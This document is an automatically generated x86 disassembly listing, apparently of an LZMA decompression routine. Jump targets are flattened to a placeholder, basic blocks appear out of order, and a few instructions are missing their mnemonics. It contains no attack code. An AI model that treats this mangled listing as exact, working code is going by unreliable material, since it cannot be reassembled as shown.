mov [ ebp - 0x8 ] eax
inc esi
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ esi + ebx ] cx
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
add esi esi
movzx edx [ esi + ebx ]
cmp edi 0x1000000
jae r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov [ esi + ebx ] dx
mov [ ebp - 0x8 ] eax
inc esi
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ esi + ebx ] cx
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
add esi esi
movzx edx [ esi + ebx ]
cmp edi 0x1000000
jae r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov [ esi + ebx ] dx
mov [ ebp - 0x8 ] eax
inc esi
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ esi + ebx ] cx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x2c ] ecx
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x3c ] edx
test ecx ecx
jne r-xdata
mov ebx esi
mov edx esi
shr ebx 0x1
and esi 0x1
dec ebx
or esi 0x2
mov [ ebp - 0x20 ] ebx
cmp edx 0xe
jae r-xdata
sub esi 0x40
mov [ ebp - 0x20 ] edi
cmp esi 0x4
jb r-xdata
cmp esi ecx
cmp esi [ ebp - 0x1c ]
jmp r-xdata
sub ebx 0x4
mov ecx ebx
shl esi cl
mov [ ebp - 0x3c ] 0x1
mov ecx esi
sub ecx edx
mov edx [ ebp - 0xc ]
lea edx [ edx + ecx * 2 ]
add edx 0x55e
mov [ ebp - 0x8 ] edx
mov ecx 0x1
cmp [ ebp - 0x10 ] 0x13
mov edx [ ebp - 0x18 ]
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0xa
mov [ ebp - 0x10 ] ecx
jae r-xdata
shr edi 0x1
sub eax edi
mov ecx eax
shr ecx 0x1f
neg ecx
lea esi [ esi * 2 + 0x1 ]
add esi ecx
and ecx edi
add eax ecx
dec ebx
jne r-xdata
mov edx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ edx ]
shl edi 0x8
or eax ecx
inc edx
mov [ ebp - 0x4 ] edx
mov ebx [ ebp - 0x8 ]
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
shl edi 0x8
or eax ecx
inc [ ebp - 0x4 ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ ebp - 0xc ]
shl esi 0x4
movzx edx [ ebx + 0x646 ]
mov [ ebp - 0x8 ] eax
cmp edi 0x1000000
jae r-xdata
sub edi ecx
sub eax ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0x40 ]
inc ecx
mov [ ecx + ebx - 0x1 ] dx
mov edx [ ebp - 0x3c ]
or esi edx
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0x40 ]
mov [ edx + ebx ] cx
mov ecx edx
mov edx [ ebp - 0x3c ]
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ebx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ebx ]
or eax ecx
shl edi 0x8
inc ebx
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
add ecx ecx
mov [ ebp - 0x40 ] ecx
movzx edx [ ecx + edx ]
cmp edi 0x1000000
jae r-xdata
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ebx [ ebp - 0x20 ]
add edx edx
dec ebx
mov [ ebp - 0x3c ] edx
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ebx
jne r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x646 ] dx
mov ecx 0x3
or esi 0x1
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov [ ebx + 0x646 ] cx
mov ecx 0x2
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
lea ebx [ ecx + ecx ]
mov ecx [ ebp - 0xc ]
movzx edx [ ebx + ecx + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0xc ]
inc ebx
mov [ ebx + ecx + 0x643 ] dx
mov [ ebp - 0x8 ] eax
or esi 0x2
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0xc ]
mov [ ebx + edx + 0x644 ] cx
mov ecx edx
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
add ebx ebx
movzx edx [ ebx + ecx + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0xc ]
inc ebx
mov [ ebx + ecx + 0x643 ] dx
mov [ ebp - 0x8 ] eax
or esi 0x4
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0xc ]
mov [ ebx + edx + 0x644 ] cx
mov ecx edx
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl eax 0x8
movzx ecx [ ecx ]
or eax ecx
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
movzx edx [ ecx + ebx * 2 + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub eax ecx
sub edi ecx
mov ecx edx
shr ecx 0x5
sub edx ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ecx + ebx * 2 + 0x644 ] dx
or esi 0x8
mov edi ecx
mov ecx 0x800
sub ecx edx
shr ecx 0x5
add ecx edx
mov edx [ ebp - 0xc ]
mov [ edx + ebx * 2 + 0x644 ] cx
jmp r-xdata
mov ebx [ ebp - 0x18 ]
mov esi [ ebp - 0x10 ]
add ebx 0x112
sub esi 0xc
jmp r-xdata
mov [ ebp - 0x20 ] edi
cmp esi 0xffffffff
je r-xdata
mov edx [ ebp - 0x4 ]
cmp edi 0x1000000
jae r-xdata
sub_4074d0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ecx [ esi + 0x48 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp ecx 0x112
jae r-xdata
mov eax [ esi + 0x24 ]
sub [ ebp - 0x4 ] eax
mov edx [ esi + 0x28 ]
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
push ebx
mov ebx [ esi + 0x38 ]
mov edx ecx
cmovb edx [ ebp - 0x4 ]
cmp [ esi + 0x30 ] 0x0
push edi
mov edi [ esi + 0x14 ]
jne r-xdata
add [ esi + 0x2c ] edx
sub ecx edx
mov [ esi + 0x48 ] ecx
test edx edx
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx [ esi + 0x2c ]
cmp ecx edx
ja r-xdata
pop edi
mov [ esi + 0x24 ] eax
pop ebx
cmp eax ebx
sbb ecx ecx
and ecx [ ebp - 0xc ]
sub ecx ebx
add ecx eax
inc eax
mov cl [ ecx + edi ]
mov [ eax + edi - 0x1 ] cl
dec edx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ esi + 0xc ]
mov [ esi + 0x30 ] ecx
sub_407550
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi edx
mov esi ecx
lea ecx [ ecx ]
push ebx
mov ecx esi
call sub_406820
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
mov ebx [ esi + 0x24 ]
sub ecx [ esi + 0x2c ]
mov eax edi
sub eax ebx
cmp eax ecx
jbe r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
cmp [ esi + 0x2c ] eax
jb r-xdata
mov ebx [ ebp + 0x8 ]
lea edx [ ebx + ecx ]
mov edx edi
mov ecx esi
call sub_4074d0
cmp [ esi + 0x24 ] edi
jae r-xdata
mov [ esi + 0x30 ] eax
cmp [ esi + 0x48 ] 0x112
jbe r-xdata
cmp [ esi + 0x18 ] ebx
jae r-xdata
xor eax eax
mov [ esi + 0x48 ] 0x112
cmp [ esi + 0x48 ] 0x112
jb r-xdata
cmp [ esi + 0x30 ] 0x0
mov edx edi
jne r-xdata
sub_4075d0
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x10 ] ebx
mov edx ecx
mov [ ebp - 0x18 ] edx
mov ecx [ edx + 0x10 ]
mov esi [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov ecx [ edx + 0x34 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ edx + 0x2c ]
mov [ ebp - 0x20 ] ecx
mov eax [ edx + 0x20 ]
mov ecx 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov ecx [ edx + 0x8 ]
shl [ ebp - 0x8 ] cl
mov ecx [ ebp - 0x8 ]
dec ecx
and ecx [ edx + 0x2c ]
add esi ebx
mov [ ebp - 0x8 ] ecx
mov ecx [ edx + 0x34 ]
shl ecx 0x4
add ecx [ ebp - 0x8 ]
mov ebx [ edx + 0x10 ]
movzx ecx [ ebx + ecx * 2 ]
mov edi [ edx + 0x1c ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] ecx
cmp edi 0x1000000
jae r-xdata
mov ecx edi
shr ecx 0xb
imul ecx [ ebp - 0x1c ]
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
mov edx [ ebp + 0x8 ]
sub edi ecx
sub eax ecx
mov ecx [ ebp - 0x14 ]
movzx edx [ edx + ecx * 2 + 0x180 ]
cmp edi 0x1000000
jae r-xdata
mov edi ecx
mov ecx [ edx + 0x10 ]
add ecx 0xe6c
cmp [ edx + 0x30 ] 0x0
mov [ ebp - 0x8 ] ecx
jne r-xdata
xor eax eax
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x10 ] ebx
mov ecx edi
shr ecx 0xb
imul ecx edx
mov edx [ ebp + 0x8 ]
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
mov esi [ edx + 0x24 ]
test esi esi
jne r-xdata
cmp [ edx + 0x2c ] 0x0
je r-xdata
sub edi ecx
sub eax ecx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x3
movzx edx [ edx + ecx * 2 + 0x198 ]
mov [ ebp - 0x20 ] edx
cmp edi 0x1000000
jae r-xdata
mov edi ecx
mov [ ebp - 0x1c ] 0x0
add edx 0x664
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov ecx [ ebp - 0x18 ]
mov edx [ edx ]
mov ecx [ ecx + 0x14 ]
movzx esi [ ecx + esi - 0x1 ]
mov ecx 0x8
sub cl dl
shr esi cl
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + 0x4 ]
shl [ ebp - 0xc ] cl
mov ecx [ ebp - 0xc ]
dec ecx
and ecx [ ebp - 0x20 ]
mov [ ebp - 0xc ] ecx
mov ecx edx
mov edx [ ebp - 0xc ]
shl edx cl
mov ecx [ ebp - 0x8 ]
add esi edx
mov edx [ ebp - 0x18 ]
imul esi esi 0x600
add ecx esi
mov esi [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov esi [ edx + 0x28 ]
cmp [ edx + 0x34 ] 0x7
jae r-xdata
mov edx edi
shr edx 0xb
imul edx [ ebp - 0x20 ]
cmp eax edx
jae r-xdata
cmp ebx esi
jae r-xdata
movzx ecx [ edx ]
mov [ ebp - 0x20 ] ecx
cmp edi 0x1000000
jae r-xdata
mov ecx [ edx + 0x38 ]
cmp [ edx + 0x24 ] ecx
jae r-xdata
mov edx 0x1
lea esp [ esp ]
sub edi edx
sub eax edx
mov edx [ ebp + 0x8 ]
movzx edx [ edx + ecx * 2 + 0x1b0 ]
cmp edi 0x1000000
jae r-xdata
mov esi [ ebp + 0x8 ]
add ecx 0xf
shl ecx 0x4
add ecx [ ebp - 0x8 ]
mov edi edx
movzx ecx [ esi + ecx * 2 ]
mov esi [ ebp - 0x4 ]
mov [ ebp - 0x20 ] ecx
cmp edx 0x1000000
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
or eax ecx
mov ecx [ ebp - 0x14 ]
shl edi 0x8
inc ebx
mov ecx edi
shr ecx 0xb
imul ecx [ ebp - 0x20 ]
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
xor esi esi
mov esi [ edx + 0x28 ]
jmp r-xdata
mov ecx edi
shr ecx 0xb
imul ecx [ ebp + 0x8 ]
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
mov ecx edi
shr ecx 0xb
imul ecx [ ebp - 0x20 ]
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
sub edi ecx
sub eax ecx
movzx ecx [ edx + 0x2 ]
mov [ ebp - 0x20 ] ecx
cmp edi 0x1000000
jae r-xdata
mov edi ecx
mov ecx [ ebp - 0x8 ]
shl ecx 0x4
add ecx 0x4
add ecx edx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov ecx edi
shr ecx 0xb
imul ecx [ ebp - 0x20 ]
cmp eax ecx
jae r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
mov ecx [ edx + 0x14 ]
sub ecx [ edx + 0x38 ]
add ecx [ edx + 0x24 ]
movzx edx [ ecx + esi ]
mov ecx 0x100
mov [ ebp + 0x8 ] ecx
mov esi 0x1
sub edi ecx
sub eax ecx
inc edx
mov edi ecx
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov edx [ ebp + 0x8 ]
sub edi ecx
sub eax ecx
mov ecx [ ebp - 0x14 ]
movzx edx [ edx + ecx * 2 + 0x1c8 ]
cmp edi 0x1000000
jae r-xdata
mov edi ecx
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
sub edi ecx
sub eax ecx
cmp ecx 0x1000000
jae r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov ecx edi
shr ecx 0xb
imul ecx [ ebp - 0x20 ]
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
mov [ ebp - 0x14 ] ecx
mov edx 0x1
nop
sub edi ecx
sub eax ecx
lea esi [ esi * 2 + 0x1 ]
mov edi ecx
add esi esi
not edx
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x4 ]
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
cmp edx 0x100
jae r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x1c ] 0xc
add edx 0xa68
pop edi
pop esi
mov eax 0x3
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx esi
jae r-xdata
sub edi ecx
sub eax ecx
lea ecx [ edx + 0x204 ]
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0x18 ] 0x100
mov edi ecx
mov ecx [ ebp - 0x8 ]
shl ecx 0x4
add ecx 0x104
add ecx edx
mov [ ebp - 0xc ] 0x8
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov ecx edi
shr ecx 0xb
imul ecx [ ebp - 0x20 ]
cmp eax ecx
jae r-xdata
cmp ebx esi
jae r-xdata
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and ecx edx
mov [ ebp + 0x8 ] ecx
cmp esi 0x100
jae r-xdata
cmp edi 0x1000000
jae r-xdata
add edx edx
movzx ecx [ edx + ecx ]
mov [ ebp + 0x8 ] ecx
cmp edi 0x1000000
jae r-xdata
mov edi ecx
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
sub edi ecx
sub eax ecx
inc edx
mov edi ecx
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov ebx [ ebp - 0x8 ]
add edx edx
mov [ ebp - 0x18 ] edx
mov edx ecx
and edx [ ebp - 0x18 ]
lea ecx [ edx + esi ]
add ecx [ ebp + 0x8 ]
movzx ecx [ ebx + ecx * 2 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] ecx
cmp edi 0x1000000
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx esi
jb r-xdata
sub [ ebp - 0xc ] ecx
add edx [ ebp - 0xc ]
cmp [ ebp - 0x1c ] 0x4
jae r-xdata
mov ecx [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp edx ecx
jae r-xdata
mov eax [ ebp - 0x10 ]
cmp edx 0x4
mov ecx 0x3
cmovb ecx edx
mov edx [ ebp + 0x8 ]
shl ecx 0x7
add edx 0x360
add ecx edx
mov [ ebp - 0x20 ] ecx
mov esi 0x1
jmp r-xdata
add edx edx
movzx ecx [ edx + ecx ]
mov [ ebp - 0x20 ] ecx
cmp edi 0x1000000
jae r-xdata
add esi esi
movzx edx [ esi + ecx ]
cmp edi 0x1000000
jae r-xdata
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp eax ecx
jae r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
sub edi ecx
sub eax ecx
inc esi
mov edi ecx
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
sub esi 0x40
cmp esi 0x4
jb r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
cmp esi 0x40
jae r-xdata
mov esi [ ebp - 0x4 ]
mov ecx esi
shr ecx 0x1
dec ecx
mov [ ebp - 0x18 ] ecx
cmp esi 0xe
jae r-xdata
sub ecx 0x4
mov [ ebp - 0x18 ] ecx
mov edx ecx
mov edx esi
and edx 0x1
or edx 0x2
shl edx cl
mov ecx [ ebp + 0x8 ]
sub edx esi
lea ecx [ ecx + edx * 2 ]
mov edx [ ebp - 0x18 ]
add ecx 0x55e
jmp r-xdata
shr edi 0x1
mov ecx eax
sub ecx edi
shr ecx 0x1f
dec ecx
and ecx edi
sub eax ecx
dec edx
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
mov [ ebp + 0x8 ] ecx
mov esi 0x1
cmp edi 0x1000000
jae r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x644
mov edx 0x4
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov ecx edi
shr ecx 0xb
imul ecx [ ebp - 0x20 ]
cmp eax ecx
jae r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
sub edi ecx
sub eax ecx
inc esi
mov edi ecx
jmp r-xdata
movzx ecx [ ebx ]
shl eax 0x8
shl edi 0x8
or eax ecx
inc ebx
mov ecx [ ebp + 0x8 ]
jmp r-xdata
dec edx
je r-xdata
add esi esi
movzx ecx [ esi + ecx ]
mov [ ebp - 0x20 ] ecx
cmp edi 0x1000000
jae r-xdata
sub_407bc0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ eax ]
mov [ ebp - 0xc ] edx
mov esi ecx
mov [ ebp - 0x4 ] edi
mov [ eax ] 0x0
call sub_4074d0
cmp [ esi + 0x48 ] 0x112
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
je r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebx ]
pop edi
xor eax eax
test ecx ecx
pop esi
setne al
pop ebx
mov esp ebp
pop ebp
retn
mov [ edx ] 0x1
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] 0x0
cmp [ esi + 0x24 ] eax
jb r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
jne r-xdata
cmp [ esi + 0x58 ] 0x5
jb r-xdata
lea ebx [ ebx ]
mov edi [ esi + 0x58 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx [ esi ]
mov eax 0x300
shl eax cl
add eax 0x736
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x20 ] eax
je r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
mov [ eax ] 0x3
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x5c ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] edi
mov al [ ebx ]
mov [ ecx + esi + 0x5c ] al
mov eax [ ebp + 0xc ]
inc [ esi + 0x58 ]
inc [ eax ]
inc ebx
dec edi
jne r-xdata
xor edx edx
mov [ ebp - 0x10 ] edx
cmp edi 0x14
jae r-xdata
mov edi [ ebp - 0x4 ]
cmp edi 0x14
jb r-xdata
mov [ esi + 0x44 ] 0x1
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x3c ] 0x1
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x50 ] 0x0
mov edi [ esi + 0x10 ]
mov ecx eax
mov eax 0x400
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
mov eax [ ebp + 0x14 ]
pop edi
pop esi
mov [ eax ] 0x2
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
mov [ eax ] 0x4
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ esi + 0x5d ]
movzx eax [ esi + 0x5e ]
shl ecx 0x8
or ecx eax
movzx eax [ esi + 0x5f ]
shl ecx 0x8
or ecx eax
movzx eax [ esi + 0x60 ]
shl ecx 0x8
or ecx eax
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x4c ] 0x0
mov [ esi + 0x58 ] 0x0
mov ecx [ esi + 0x58 ]
cmp ecx 0x5
jae r-xdata
mov [ esi + 0x58 ] edi
cmp edi 0x14
jb r-xdata
mov ecx [ ebp - 0x4 ]
nop
push edi
mov edx ebx
mov ecx esi
call sub_4075d0
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x2
mov [ ebp - 0x8 ] 0x1
lea edx [ esi + 0x5c ]
push edi
mov ecx esi
call sub_4075d0
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] edx
mov al [ edx + ebx ]
mov [ esi + edi + 0x5c ] al
inc edi
inc edx
cmp edi 0x14
jb r-xdata
push edi
lea eax [ esi + 0x5c ]
push ebx
push eax
call sub_41a1a0
mov eax [ ebp + 0xc ]
add esp 0xc
add [ eax ] edi
mov [ esi + 0x58 ] edi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ edi - 0x14 ]
add eax ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
add [ eax ] ecx
mov eax [ ebp + 0x14 ]
pop edi
pop esi
mov [ eax ] 0x3
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
lea eax [ esi + 0x5c ]
push eax
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_407550
test eax eax
jne r-xdata
cmp edx ecx
jae r-xdata
mov eax ebx
cmp eax 0x2
jne r-xdata
mov edx [ ebp - 0xc ]
push eax
mov ecx esi
mov [ esi + 0x18 ] ebx
call sub_407550
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x10 ]
sub eax edi
mov edi [ ebp - 0x4 ]
sub eax esi
add ecx 0xffffffa4
add eax ecx
mov [ esi + 0x58 ] 0x0
mov eax [ esi + 0x18 ]
sub eax ebx
jmp r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
sub edi eax
add [ ecx ] eax
add ebx eax
cmp [ esi + 0x48 ] 0x112
mov [ ebp - 0x4 ] edi
jne r-xdata
sub_407eb0
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x8 ] 0x5
push ebx
push esi
push edi
mov edi ecx
jb r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
mov esp ebp
pop ebp
retn
movzx esi [ edx + 0x4 ]
movzx eax [ edx + 0x3 ]
shl esi 0x8
or esi eax
movzx eax [ edx + 0x2 ]
shl esi 0x8
or esi eax
movzx eax [ edx + 0x1 ]
shl esi 0x8
or esi eax
mov eax 0x1000
cmp esi eax
cmovb esi eax
mov al [ edx ]
mov [ ebp - 0x4 ] esi
cmp al 0xe1
jae r-xdata
movzx eax al
cdq
mov ecx 0x9
idiv ecx
mov esi 0x5
mov ebx 0x300
movzx eax al
mov ecx edx
cdq
idiv esi
mov [ ebp - 0x10 ] ecx
add ecx edx
shl ebx cl
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] edx
add ebx 0x736
test eax eax
je r-xdata
mov esi [ ebp + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push esi
call eax
lea eax [ ebx + ebx ]
push eax
mov [ edi + 0x10 ] 0x0
mov eax [ esi ]
push esi
call eax
add esp 0x10
mov [ edi + 0x10 ] eax
mov [ edi + 0x54 ] ebx
test eax eax
jne r-xdata
cmp ebx [ edi + 0x54 ]
je r-xdata
movq xmm0 [ ebp - 0x10 ]
movq [ edi ] xmm0
movq xmm0 [ ebp - 0x8 ]
movq [ edi + 0x8 ] xmm0
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407fa0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ edx ] ax
jne r-xdata
mov ecx edx
push edi
lea edi [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
push ecx
push edx
mov ecx esi
call sub_408240
mov eax esi
pop esi
pop ebp
retn 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
pop edi
push ecx
push edx
mov ecx esi
call sub_408240
mov eax esi
pop esi
pop ebp
retn 0x4
sub_408000
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi ] ax
pop esi
retn
push [ esi ]
call j_sub_417912#2
add esp 0x4
sub_408030
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
cmp [ edx ] 0x0
mov esi ecx
jne r-xdata
mov eax edx
push edi
lea edi [ eax + 0x2 ]
xor eax eax
push eax
push edx
call sub_408240
pop esi
pop ebp
retn 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
pop edi
